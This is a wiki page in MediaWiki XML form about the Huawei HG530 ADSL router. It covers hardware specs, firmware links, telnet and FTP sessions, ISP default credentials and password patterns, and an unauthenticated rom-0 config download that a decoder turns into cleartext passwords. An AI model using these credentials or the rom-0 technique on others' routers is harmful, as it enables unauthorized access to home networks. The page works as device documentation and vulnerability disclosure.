<page>
    <title>Huawei HG530</title>
    <ns>0</ns>
    <id>65352</id>
    <revision>
      <id>336456</id>
      <parentid>336455</parentid>
      <timestamp>2019-07-05T04:43:42Z</timestamp>
      <contributor>
        <username>imported&gt;M86</username>
        <id>0</id>
      </contributor>
      <minor/>
      <comment>Text replacement - &quot;speed=10/100&quot; to &quot;speed=100M&quot;</comment>
      <origin>336456</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10498" sha1="6nx3rxh94224hwprnck3ehnjgj5gpgm" xml:space="preserve">{{Wireless embedded system
|brand=Huawei
|model=HG530
|manuf_country=China
|is_manuf=No
|type=wireless router, dsl modem
|fcc_id=QISHG530
|pwr_v=12
|pwr_amp=0.5
|pwr_conn=barrel
|cpu1_brand=TrendChip
|cpu1_model=TC3162U;TC3162U-LQ128G; ,,,
|fla1=2
|fla1_brand=Macronix
|fla1_model=MX25L1606E
|ram1=8
|ram1_brand=EtronTech
|ram1_model=EM638165TS-6G
|wi1_chip1_brand=Ralink
|wi1_chip1_model=RT3390;RT3390L; ,,,
|wi1_802dot11_protocols=bgn
|wi1_ant_conn=U.FL
|wi1_txchains=1
|wi1_rxchains=1
|wi1_sstreams=1
|eth_none=
|eth_cpu=true
|sw_brand=TrendChip
|sw_model=TC2206F
|lan_speed=100M
|lan_ports=4
|addl_chips=DSL (ADSL2+) AFE;TrendChip;TC3086;TRENDCHIP, TC3086-QFN64-EPG, C2W49800, TP1130B5;1;
|flags=ADSL2+
|stock_os=ZyNOS
|802dot11_protocols=bgn
|default_ip=192.168.1.1
|default_user=admin
|default_pass=admin
|oui=AC:E8:7B
|oui_eth=AC:E8:7B
}}
{{TagLine|Huawei HG530 - Wireless ADSL Modem Router}}

Router is labeled: &quot;bg Wi-Fi certified, with some n features&quot;. It is a draft-n router, compatible with 802.11n standard.

Same chipset as [http://wiki.openwrt.org/toh/zyxel/p-660hn-txa ZyXEL P-660HN-TxA] ([ftp://ftp.zyxel.com/P-660HN-T1A/ T1A], [ftp://ftp.zyxel.com/P-660HN-T3A/ T3A]), [http://natthapol89.blogspot.com/2014/04/billion-wireless-n-adsl2-firewall.html Billion BiPAC 5200W] ([http://www.bectechnologies.net/main/support/usermanual/BEC5200W_UserManual.pdf Manual]), and [[D-Link_DSL-2680_rev_A1]] (2 LAN ports only).

==Additional external links==
====Manuals====
:[http://www.bestphone.com.ar/comercio46/html/385240HUAWEI_HG530_Home_Gateway_Product_Description%20(1).pdf Product Description]
:[http://setuprouter.com/router/huawei7hg530/manual-157.pdf User Guide]
:[http://download-c.huawei.com/download/downloadCenter?downloadId=11904 User Guide]
:[http://download-c.huawei.com/download/downloadCenter?downloadId=11903 User Guide (Spanish)]
====Firmware====
:[http://downloads.telmex.com/zip/EchoLifeHG530.rar Telmex branded firmware]
:[http://www.telnor.com/descargas/HG530%20V100R001C10B122SP01g_20120309.rar Telnor firmware]
:[http://solucionesrgm.jimdo.com/app/download/4749109360/Huawei.rar?t=131947467 ColombiaTel firmware]
:[http://www.etb.com.co/comco/zona_soporte/html/BA/CPEHuaweiHG530.rar ETB firmware (zip archive, not rar!)]
====Components====
:[http://www.mxic.com.tw/Lists/DataSheet/Attachments/1619/MX25L1606E%2C%203V%2C%2016Mb%2C%20v1.5.pdf MX25L1606E datasheet]
:[http://www.etron.com/manager/uploads/EM638165TS_rev3.2.pdf EM638165TS datasheet]
====Command Line==== 
:(selection of ZyXEL devices as no matching Huawei CLI guide found)
:[http://www.zyxeltech.de/snotep334w/ci_cmd/p334_ci.htm Prestige 334w CI Command List]
:[ftp://ftp.zyxel.com/P-660HN-F1/cli_reference_guide/P-660HN-F1_1.pdf CLI Reference Guide Version 3.70]
:[ftp://ftp.zyxel.com/XS3900-48F/cli_reference_guide/XS3900-48F_1.pdf CLI Reference Guide Versions: 3.79, 3.80, 3.90, 4.00]
:[http://www.vaxination.ca/tcpip/zynos_commands.html ZyNOS CI and BootBase Commands (ZyNOS 1999)]
:[http://www.ixo.de/info/zyxel_uclinux/ Using the console port]

===Router login===
The HG530 supports 3 different user names; login is possible by using the following protocols.

*Web interface: '''http'''
*Console login: '''telnet'''
*File transfer: '''ftp'''

====Default login user &amp; password====
The HG530 was often distributed as custom branded version by ISP's such as [http://www.telmex.com/web/asistencia/guia-modem-huawei Telmex] or [http://en.wikipedia.org/wiki/Claro_Americas Claro]&lt;br&gt;(both ISPs in the Latin America region) with non-standard login user/password combinations.

The pictures below show a Claro branded router with [http://www.svcommunity.org/forum/internet-redes/como-entrar-al-modem-huawei-hg530-de-claro-y-criticas/ admin defaults found here] (tested),&lt;br&gt;while defaults for user2 and user3 were extracted from ''rom-0'' backup file (tested):
{{SCollapse|login user &amp; password
|
*login user1: '''admin'''
*login password1: '''Tu64$TEL'''
*login user2: '''usuario'''
*login password2: '''Turbonett'''
*login user3: '''user'''
*login password3: '''Turbonett'''

Claro Dominican Republic [http://asistencia.claro.com.do/app/answers/detail/a_id/498/~/instructivo-del-m%C3%B3dem-residencial-huawei-hg-530 instructions] suggests (untested):
*login user: '''(MAC address as on label)'''
*login password: '''(MAC address as on label)'''

Telmex branded router according to [http://downloads.telmex.com/pdf/huawei530.pdf firmware update instructions] (untested):
*login user: '''Telmex'''
*login password: '''(WEP key from label on backside)'''

Other likely user/password combinations as found [http://escribojava.blogspot.com/2011/09/clave-de-acceso-de-modem-huawei-hg530.html here] and [http://blog.jorgeivanmeza.com/2011/12/solucionando-mis-problemas-con-el-modem-huawei-hg530/ here] (untested):
*login user: '''admin'''
*login password: '''d3c0ntr0l'''
or
*login user: '''admin'''
*login password: '''CEP#(plus last 6 digits of serial number)'''&lt;br&gt;e.g. serial number: 89546123011578, password: CEP#011578
}}

===Telnet===
Opens a session with the ZyNOS CI. All users (admin, user) have full privileges!

{{SCollapse|telnet
|&lt;pre&gt;
$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

Username: admin

Password: ********
Copyright (c) 2001 - 2011 Huawei

HG530&gt; help
Valid commands are:
sys             exit            ether           wan               
etherdbg        tcephydbg       ip              bridge            
dot1q           pktqos          show            set               
lan

HG530&gt; sys
modfTTL         edit            feature         hostname          
log             resetlog        stdio           syslog            
version         view            wdog            romreset          
factoryreset    atssid          atwpakey        atwepkey          
acl             keytest         atsh            diag              
routeip         bridge          save            display           
password        default         batchnumber     versionstyle      
versionM        multiuser       password2nd     username2nd       
deleteUser      getusername2nd  password3rd     username3rd       
delete3rdUser   getusername3rd  adminname       modelcheck        
attainrateflag  pswauthen       setser          resetbtntime      
setdefaultlanip fwuptimeout     sptromsize      syncinterval      
tcpdebug        cwmp            socket          filter            
cpu
&lt;/pre&gt;}}

{{SCollapse|sys version
|&lt;pre&gt;
HG530&gt; sys version

 RAS version: V100R001C10B023 SALVADOR
 RAS version(web): V100R001B023 SALVADOR 2011/04/27 
 System   ID: $5.1.54.0(RUE0.C2)3.12.8.20     20110407_V001  [Apr 07 2011 15:06:42]
 romRasSize: 1357172 
 system up time:     2:03:49 (b5601 ticks)
 bootbase version: VTC_SPI1.11 | 2011/03/11

HG530&gt; sys atsh

RAS version            : V100R001B023 SALVADOR
romRasSize             : 1363726
bootbase version       : VTC_SPI1.13 | 2011/10/13
Product Model          : Home Gateway
MAC Address            : ACE87B008C88
Default Country Code   : FF
Boot Module Debug Flag : 00
RomFile Version        : 01
RomFile Checksum       : d396
RAS F/W Checksum       : 5685
SNMP MIB level &amp; OID   : 050000000100000002000000030000000400000005
Main Feature Bits      : 86
Other Feature Bits     :
93 17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 13 00 00 00

HG530&gt; sys getusername2nd
secondUserName: usuario
HG530&gt; sys getusername3rd
thirdUserName: user
&lt;/pre&gt;}}

====FTP====
Gives write-only access to the firmware, and read/write access to the ''rom-0'' backup file. 
:Only user admin is allowed to login!
{{SCollapse|ftp
|&lt;pre&gt;
$ ftp 192.168.1.1
Connected to 192.168.1.1.
220 HG530 FTP version 1.0 ready at Sat Jan 01 05:50:34 2000
Name (192.168.1.1:john): admin
331 Enter PASS command
Password:
230 Logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 Port command okay
150 Opening data connection for LIST 
--w--w--w-   1 owner    group         1363726 Jul 01 12:00 ras
-rw-rw-rw-   1 owner    group          131072 Jul 01 12:00 rom-0
?226 File sent OK

$ ftp 192.168.1.1
Connected to 192.168.1.1.
220 HG530 FTP version 1.0 ready at Sat Jan 01 02:08:30 2000
Name (192.168.1.1:john): user
530 User user cannot log in.
Login failed.
&lt;/pre&gt;}}

===Vulnerabilities===
====rom-0====
As many other ZyNOS based devices, the HG530 allows downloading the configuration backup file ''rom-0'' without any authentication.
&lt;pre&gt;
http://192.168.1.1/rom-0
&lt;/pre&gt;

The ''rom-0'' file is LZS compressed (see [http://www.hakim.ws/huawei/rom-0/kender.html reverse engineering the zyxel configuration backup file] and [http://reverseengineering.stackexchange.com/questions/3662/backup-from-zynos-but-can-not-be-decompressed-with-lzs static analysis]). 
:The [https://github.com/etmatrix/rom0_decoder/blob/master/rom0.jar java based rom-0 decoder] from [https://github.com/etmatrix/rom0_decoder github] reveals clear text login password, SSID and WEP key.

&lt;pre&gt;
$ java -jar rom0.jar rom-0
.l.password.HG530.u.public.a.dhcpp.192.43.244.18.P.E.5.user.Turbonett.@.l.password.HG530.u.public.l.password.HG530.u.`.L.2`ISP-0.{. .turbonett.RN.}.d.-.@.@.L.0. .d.B.RN.w`.{.0.@.0.@.$.L.Q.'P.dhcppc.}.d.+.*.HG520.d. .$.(.0.SUA.8.P.Z.d. .$.A.^.&gt;._=. .H. TURBONETT_008C88.d.+.*.74E75C4CDB.3.&quot;.%.@!.dd.d.RT3390_2.A.^.&gt;._=.3. .H. TURBONETT_008C88.d.+.*.4.4.vlan14.5.C!.(.(.1`.W$h.(.(.1`.W$h.$.@.@usuario.%.Q.{/tr069.H.wei Technologies Co., Ltd.HG530.00E0FC.HG530TRA.0.1-.T.:.Z.4.33_4.0.H.0.Wf.
&lt;/pre&gt;

TBD: Credential disclosure in modems Huawei HG510, HG520x, HG530 and possibly others [http://websec.ca/blog/view/mac2wepkey_huawei] [http://calderonpale.com/wepwpa-key-generator-for-huawei-gateways/] [http://seclists.org/nmap-dev/2012/q2/346] [http://seclists.org/nmap-dev/2012/q2/att-346/huawei-hg5xx-info.nse] [https://svn.nmap.org/nmap/scripts/http-huawei-hg5xx-vuln.nse]

==Images==
===from [[User:Zerohero]]===
&lt;gallery&gt;
File:Huawei HG530 Front.jpg|Front &amp; Top View
File:Huawei HG530 Back.jpg|Back Side
File:Huawei HG530 PCB.jpg|Printed Circuit Board
File:Huawei HG530 PCB CPU.jpg|PCB (CPU,RAM,Switch)
File:Huawei HG530 PCB ADSL.jpg|PCB (ADSL,CPU,Flash)
File:Huawei HG530 PCB WLAN.jpg|PCB (WLAN,RAM,CPU)
File:Huawei_HG530_System_Information.png|System Information
&lt;/gallery&gt;[[Has images::internal| ]]

P.S. Others pictures [http://s48.radikal.ru/i121/1112/c2/e198c97aa709.jpg] [http://i4.otzovik.com/2012/09/28/274848/img/89646168.jpg] do show a 3rd on-board switching regulator.

__NOTOC__</text>
      <sha1>6nx3rxh94224hwprnck3ehnjgj5gpgm</sha1>
    </revision>
  </page>